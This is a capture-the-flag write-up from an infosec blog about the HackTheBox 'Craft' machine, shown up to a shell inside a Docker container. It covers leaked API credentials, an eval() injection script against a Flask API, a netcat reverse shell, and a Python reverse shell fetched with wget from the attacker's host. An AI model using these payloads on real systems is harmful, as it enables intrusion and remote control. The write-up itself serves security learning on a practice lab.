<!DOCTYPE html>
<html lang=en>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Craft was very interesting and well designed box. It was a not so straight forward to solve and mainly based on configuration mistakes rather than exploits. That makes it more interesting in my opin">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox - Craft">
<meta property="og:url" content="https://hg8.sh/posts/craft/index.html">
<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
<meta property="og:description" content="Craft was very interesting and well designed box. It was a not so straight forward to solve and mainly based on configuration mistakes rather than exploits. That makes it more interesting in my opin">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82154040-9cee3180-986b-11ea-9048-4be3630fbacc.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/67158804-0db48600-f33d-11e9-98f1-b10407a44179.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/67158918-b8797400-f33e-11e9-9223-2ac64d958595.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/67158927-c8915380-f33e-11e9-8c59-cc2973c76cfd.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/67160472-668e1980-f351-11e9-8cb2-f2f49bae0833.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/67162678-94318d80-f366-11e9-9377-04c310d8654a.png">
<meta property="article:published_time" content="2020-01-03T23:00:00.000Z">
<meta property="article:modified_time" content="2022-08-04T08:37:52.827Z">
<meta property="article:author" content="hg8">
<meta property="article:tag" content="linux">
<meta property="article:tag" content="python">
<meta property="article:tag" content="git">
<meta property="article:tag" content="craft">
<meta property="article:tag" content="gogs">
<meta property="article:tag" content="api">
<meta property="article:tag" content="flask">
<meta property="article:tag" content="eval">
<meta property="article:tag" content="vault">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/82154040-9cee3180-986b-11ea-9048-4be3630fbacc.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
     
    <title>HackTheBox - Craft :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
    
<link rel="stylesheet" href="/css/style.css">

    
    
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="hg8's Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/posts/bitlab/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/posts/wall/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
    </span>
    <br/>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Remote-code-execution-on-API"><span class="toc-number">1.2.</span> <span class="toc-text">Remote code execution on API</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-from-docker-container-to-user"><span class="toc-number">1.3.</span> <span class="toc-text">Pivot from docker container to user</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">2.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploiting-Vault-for-SSH-root-password"><span class="toc-number">2.2.</span> <span class="toc-text">Exploiting Vault for SSH root password</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        <header id="header">
  <a href="/">
  
      <div id="logo" style="background-image: url(/images/logo.webp);"></div>
  
    <span class="logo__mark"></span>
    <span class="logo__text">./hg8.sh</span>
    <span class="logo__cursor"></span>
  </a>
  <div id="nav">
    <ul>
      <li class="icon">
        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
      </li>
       
        <li><a href="/">Home</a></li>
       
        <li><a href="/about/">About</a></li>
       
        <li><a href="/archives/">Posts</a></li>
       
        <li><a href="/search/">Search</a></li>
      
    </ul>
  </div>
</header>

        
          <br>
          <br>
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        HackTheBox - Craft
    </h1>



    <div class="meta"> 
      
    <div class="postdate">
      
        <time datetime="2020-01-03T23:00:00.000Z" itemprop="datePublished">04-01-2020</time>
        
      
    </div>


      — Written by 
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">hg8</span>
      </span>
      —
      13 min read
    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <img width="582" alt="craft-hackthebox" src="https://user-images.githubusercontent.com/9076747/82154040-9cee3180-986b-11ea-9048-4be3630fbacc.png">

<p>Craft was very interesting and well designed box. It was a not so straight forward to solve and mainly based on configuration mistakes rather than exploits. That makes it more interesting in my opinion since we get closer to real life scenarios. I also learned a few tricks on this one.</p>
<p><strong>Tl;Dr:</strong> The user flag was accessible after finding the main API credentials in the Git history of the project. With access to the code source and the API itself, we find a vulnerability allowing Remote Code Execution. This RCE leads to a shell inside of a Docker. From this shell we access the API config files containing database connection settings allowing us to extract users credentials stored there. The credentials let us access to <code>gilfoyle</code> repositories where one contains his SSH key backup. Using this SSH key we connect to his account and grab the user flag.<br>The root flag was accessible after using Vault instance configured on the box to generate a One Time Password for the SSH <code>root</code> account. We connect through SSH using this password and get the flag.</p>
<p>Alright! Let’s get into the details now!</p>
<hr>
<p>First thing first, let’s add the box IP to the host file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.110 craft.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>and let’s start!</p>
<h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC craft.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-20 01:26 CEST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> craft.htb (10.10.10.110)</span><br><span class="line">Host is up (0.048s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)</span><br><span class="line">443/tcp open  ssl/http nginx 1.15.8</span><br><span class="line">|_http-server-header: nginx/1.15.8</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 17.15 seconds</span><br></pre></td></tr></table></figure>

<p>We have a classical web app running on port 443 and the ssh port 22 open.</p>
<p>Opening <code>http://craft.htb</code> display the following website :</p>
<p><img src="https://user-images.githubusercontent.com/9076747/67158804-0db48600-f33d-11e9-98f1-b10407a44179.png" alt="Craft Website"></p>
<p>The website is super simple but give us two valuable information:</p>
<ul>
<li>A <code>gogs</code> instance is running (<code>gogs</code> is a self-hosted Git service written in Go) at <code>https://gogs.craft.htb/</code></li>
<li>An API is running and its documentation available at <code>https://api.craft.htb/api/</code></li>
</ul>
<p>We need to add those two in our <code>/etc/hosts/</code> file to be able to access it :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.110 gogs.craft.htb&quot;</span> &gt;&gt; /etc/hosts</span><br><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.110 api.craft.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>Following this, <code>https://gogs.craft.htb</code> displays:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/67158918-b8797400-f33e-11e9-9223-2ac64d958595.png" alt="Gogs instance Craft website"></p>
<p>and <code>https://api.craft.htb</code> displays:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/67158927-c8915380-f33e-11e9-8c59-cc2973c76cfd.png" alt="Craft API website"></p>
<p>We have the source code and the documentation of the API. That will surely be our entry point.</p>
<p>Out of curiosity I checked for exploit on <code>Gogs</code> and found CVE-2018-18925 and CVE-2018-20303:</p>
<blockquote>
<p>Gogs 0.11.66 allows remote code execution because it does not properly validate session IDs, as demonstrated by a “..” session-file forgery in the file session provider in file.go.<br><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2018-18925">https://nvd.nist.gov/vuln/detail/CVE-2018-18925</a></p>
</blockquote>
<blockquote>
<p>In pkg/tool/path.go in Gogs before 0.11.82.1218, a directory traversal in the file-upload functionality can allow an attacker to create a file under data/sessions on the server.<br><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2018-20303">https://nvd.nist.gov/vuln/detail/CVE-2018-20303</a></p>
</blockquote>
<p>An exploit is also available (<a target="_blank" rel="noopener" href="https://github.com/TheZ3ro/gogsownz">GogsOwnz</a>) and allows to gain administrator rights and RCE on a Gogs/Gitea server.</p>
<p>Unfortunately the footer of <code>https://gogs.craft.htb</code> shows that the version used is not a vulnerable one :</p>
<blockquote>
<p>© 2018 Gogs Version: 0.11.86.0130</p>
</blockquote>
<p>This confirms that our entry point will probably be the api. Let’s investigate.</p>
<p>We have access to the source code it will greatly help our investigation. The API is written in Python using the Flask framework.</p>
<p>Let’s clone it to check the code more easily :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ GIT_SSL_NO_VERIFY=<span class="literal">true</span> git <span class="built_in">clone</span> https://gogs.craft.htb/Craft/craft-api.git</span><br></pre></td></tr></table></figure>

<h3 id="Remote-code-execution-on-API"><a href="#Remote-code-execution-on-API" class="headerlink" title="Remote code execution on API"></a>Remote code execution on API</h3><p>The first thing I do when doing static code analysis is checking if dangerous functions are used and can be exploited for command injection. It’s the easiest way to land a shell on a box.<br>If this search don’t give any results I will move on to SQL injection and so on.</p>
<p>The most common way command injection vulnerability get introduced in Python is by the use of <code>eval()</code> function which is used to run the Python code (passed as argument) within the program.</p>
<p>A quick <code>grep</code> will tell us if such function is used within the API:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ grep -ri <span class="string">&quot;eval&quot;</span> craft-api</span><br><span class="line">craft-api/craft_api/api/brew/endpoints/brew.py:        <span class="keyword">if</span> <span class="built_in">eval</span>(<span class="string">&#x27;%s &gt; 1&#x27;</span> % request.json[<span class="string">&#x27;abv&#x27;</span>]):</span><br></pre></td></tr></table></figure>

<p>We are lucky, and just by the look of the line it seems like no sanitization is done and the <code>abv</code> request parameter is directly run through <code>eval()</code>.</p>
<p>Reading through the code of <code>brew.py</code> confirm the suspicion:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@auth.auth_required</span></span><br><span class="line"><span class="meta">@api.expect(<span class="params">beer_entry</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Creates a new brew entry.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make sure the ABV value is sane.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">eval</span>(<span class="string">&#x27;%s &gt; 1&#x27;</span> % request.json[<span class="string">&#x27;abv&#x27;</span>]):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ABV must be a decimal value less than 1.0&quot;</span>, <span class="number">400</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    create_brew(request.json)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="number">201</span></span><br></pre></td></tr></table></figure>

<p>Any Python code sent in the request <code>abv</code> parameter will get interpreted. </p>
<p>Unfortunately <code>@auth.auth_required</code> inform us that we will first need a way to authenticate ourselves before being able to use this vulnerable endpoint.</p>
<p>After reading the documentation and the source code, it doesn’t seem there is any way to create a new account or use an already made token to authenticate to the API. We need to find another way to authenticate.</p>
<p>Since we have access to the git repository, we can try to exploit common flaw found in git/svn repositories. The most common issue is developers accidentally push API keys, token or password to the repository.</p>
<p>There is a few good tools like <a target="_blank" rel="noopener" href="https://github.com/dxa4481/truffleHog">truffleHog</a> or <a target="_blank" rel="noopener" href="https://github.com/awslabs/git-secrets">git-secrets</a> that allows to automatically retrieve secrets and credentials accidentally committed.</p>
<p>Since there is only 6 commits in history we can manually review them to make sure we don’t forget anything. </p>
<p>At commit <code>a2d28ed155</code> we find an interesting cleanup:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/67160472-668e1980-f351-11e9-8cb2-f2f49bae0833.png" alt="Commit cleanup"></p>
<p>Let’s try to use those credentials to authenticate to the API:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl <span class="string">&quot;https://api.craft.htb/api/auth/login&quot;</span> -k --user dinesh:4aUh0A8PbVJxgd</span><br><span class="line">&#123;<span class="string">&quot;token&quot;</span>:<span class="string">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcxNTc5ODMwfQ.JpQJlqqc_pYA6Pd3ILx4zDOaXSPYwJ6yMELyIWXDDCE&quot;</span>&#125;</span><br><span class="line">[hg8@archbook ~]$ curl -H <span class="string">&quot;X-Craft-Api-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcxNTc5ODMwfQ.JpQJlqqc_pYA6Pd3ILx4zDOaXSPYwJ6yMELyIWXDDCE&quot;</span>  <span class="string">&quot;https://api.craft.htb/api/auth/check&quot;</span> -k</span><br><span class="line">&#123;<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Token is valid!&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>We are authenticated! Note here that this API doesn’t use the usual <code>Authorization: Bearer &lt;token&gt;</code> header but a custom header in the format <code>X-Craft-Api-Token: &lt;token&gt;</code>. It can be easy to overlook this one, that’s why taking time to read the code and understanding the inner workings of the app is important.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># craft_api/api/auth/endpoints/auth.py</span></span><br><span class="line">token = request.headers[<span class="string">&#x27;X-Craft-Api-Token&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>We have now all the needed information to perform our command injection :)</p>
<p>Since we need to authenticate and perform multiple queries on the <code>/brew</code> endpoint it’s better to write a script instead of having to do a thousand of curl request.</p>
<p>No need to start from scratch since <code>craft-api/tests/test.py</code> already provide a solid base. I tweaked it a little to end up with this script:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">&#x27;https://api.craft.htb/api/auth/login&#x27;</span>,  auth=(<span class="string">&#x27;dinesh&#x27;</span>, <span class="string">&#x27;4aUh0A8PbVJxgd&#x27;</span>), verify=<span class="literal">False</span>)</span><br><span class="line">json_response = json.loads(response.text)</span><br><span class="line">token = json_response[<span class="string">&#x27;token&#x27;</span>]</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;X-Craft-API-Token&#x27;</span>: token, <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">&#x27;https://api.craft.htb/api/auth/check&#x27;</span>, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(response.text)  <span class="comment"># make sure token is valid</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    cmd = <span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    brew_dict = &#123;&#125;</span><br><span class="line">    brew_dict[<span class="string">&#x27;abv&#x27;</span>] = <span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;&#123;&#125;&quot;).read()&#x27;</span>.<span class="built_in">format</span>(cmd)</span><br><span class="line">    brew_dict[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;bullshit&#x27;</span></span><br><span class="line">    brew_dict[<span class="string">&#x27;brewer&#x27;</span>] = <span class="string">&#x27;bullshit&#x27;</span></span><br><span class="line">    brew_dict[<span class="string">&#x27;style&#x27;</span>] = <span class="string">&#x27;bullshit&#x27;</span></span><br><span class="line">    </span><br><span class="line">    json_data = json.dumps(brew_dict)</span><br><span class="line">    response = requests.post(<span class="string">&#x27;https://api.craft.htb/api/brew/&#x27;</span>, headers=headers, data=json_data, verify=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>Since <code>eval()</code> will run any python code we will use this lambda function <code>__import__(&quot;os&quot;).popen(&quot;CMD&quot;).read()</code> to run an OS command from the python code.</p>
<p>I added an <code>input(&#39;&gt; &#39;)</code> so we simply have to type our command to run it on the API. Shell style.</p>
<p>Unfortunately we don’t have any output available, so how are we going to know that our command executed successfully ?</p>
<p>With time-based injection ;)</p>
<p>We are going to inject a <code>sleep 3</code> command at each run:</p>
<ul>
<li>If the API hang for 3 seconds, it means our command got executed successfully</li>
<li>If the API respond immediately, the injection failed.</li>
</ul>
<p>Using the <code>requests</code> library <code>elapsed.total_seconds()</code> function, we can display the time elapsed for the request to success.</p>
<p>I add it to the script so we can easily see if the <code>sleep 5</code> injection worked fine.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Execution time: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(response.elapsed.total_seconds()))</span><br></pre></td></tr></table></figure>

<p>Let’s it give a try:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python test.py</span><br><span class="line">&#123;<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Token is valid!&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&gt; <span class="built_in">test</span></span><br><span class="line">Execution time: 0.147798</span><br><span class="line">&gt; sleep 3</span><br><span class="line">Execution time: 3.158874</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>Looks like it works fine ! Let’s tweak our script a bit to be more comfortable to use:</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- brew_dict[&#x27;abv&#x27;] = &#x27;__import__(&quot;os&quot;).popen(&quot;&#123;&#125;&quot;).read()&#x27;.format(cmd)</span></span><br><span class="line"><span class="addition">+ brew_dict[&#x27;abv&#x27;] = &#x27;__import__(&quot;os&quot;).popen(&quot;&#123;&#125; &amp;&amp; sleep 3&quot;).read()&#x27;.format(cmd)</span></span><br></pre></td></tr></table></figure>

<p>The usage of <code>&amp;&amp; sleep 3</code> means that the sleep command will only get executed if the first command succeeded. This technique will allow us to blindly learn about the box environment.</p>
<p>Here is an example to illustrate:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python test.py</span><br><span class="line">&#123;<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Token is valid!&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&gt; curl --<span class="built_in">help</span></span><br><span class="line">Execution time: 0.162407</span><br><span class="line">&gt; wget --<span class="built_in">help</span></span><br><span class="line">Execution time: 3.160078</span><br></pre></td></tr></table></figure>

<p>Since <code>wget --help</code> command took 3 seconds to execute this means that the command ran fine. While <code>curl --help</code> failed, the <code>sleep 3</code> didn’t start meaning <code>curl</code> is not probably not installed.</p>
<p>This little trick will allow us to have a valuable feedback to know if our command succeed or fail.</p>
<p>Let’s try to open our classic reverse shell. Start with our listener:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure>

<p>And launch our test script on the API:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python test.py</span><br><span class="line">&#123;<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Token is valid!&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&gt; nc -e /bin/sh 10.10.10.85 8585</span><br><span class="line">Execution time: 0.218422</span><br><span class="line">&gt; nc --<span class="built_in">help</span></span><br><span class="line">Execution time: 3.412322</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>Oddly enough this is not working, whereas <code>nc</code> seems to be installed. That’s strange but let’s move on to a different type of reverse shell. Since we know for sure that Python is installed let’s use a Python reverse shell.</p>
<p>To make things easier let’s launch a small http server to host our python reverse shell file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat hg8.py</span><br><span class="line">import socket,subprocess,os;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">s.connect((<span class="string">&quot;10.10.10.85&quot;</span>,8585));</span><br><span class="line">os.dup2(s.fileno(),0);</span><br><span class="line">os.dup2(s.fileno(),1);</span><br><span class="line">os.dup2(s.fileno(),2);</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure>

<p>And back to our original terminal let’s launch our injection:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python test.py</span><br><span class="line">&#123;<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Token is valid!&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&gt; wget 10.10.10.85:8000/hg8.py -O /tmp/hg8.py</span><br><span class="line">Execution time: 1.15602</span><br><span class="line">&gt; python /tmp/hg8.py</span><br></pre></td></tr></table></figure>

<p>And surely enough a connection open on our <code>netcat</code> listener:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.110:57154</span><br><span class="line">/opt/app <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</span><br></pre></td></tr></table></figure>

<p><em>Note: Now that we are on the box we can investigate on why our original <code>netcat</code> command wasn’t working. Turn out the <code>netcat</code> version shipped in this box in a Busybox version. The manual state:</em></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/opt/app <span class="comment"># nc</span></span><br><span class="line">BusyBox v1.29.3 (2019-01-24 07:45:07 UTC) multi-call binary.</span><br><span class="line"></span><br><span class="line">Usage: nc [OPTIONS] HOST PORT  - connect</span><br><span class="line">nc [OPTIONS] -l -p PORT [HOST] [PORT]  - listen</span><br><span class="line"></span><br><span class="line">    -e PROG    Run PROG after connect (must be last)</span><br><span class="line">   [...]</span><br></pre></td></tr></table></figure>

<p><em>In this version <code>-e</code> option <strong>must be last</strong>. So if we ran <code>nc 10.10.10.85 8585 -e /bin/sh</code> instead of <code>nc -e /bin/sh 10.10.10.85 8585</code> the command would have succeeded perfectly. I tried and it worked. Odd but good to keep in mind for the future.</em></p>
<h3 id="Pivot-from-docker-container-to-user"><a href="#Pivot-from-docker-container-to-user" class="headerlink" title="Pivot from docker container to user"></a>Pivot from docker container to user</h3><p>Now back to our topic. We got our shell on the API. Unfortunately as you noticed with the <code>id</code> command, it seems like we are in a docker container. We probably won’t go far from here.</p>
<p>Our best bet might be to retrieve the API secrets to see if we can progress from here.</p>
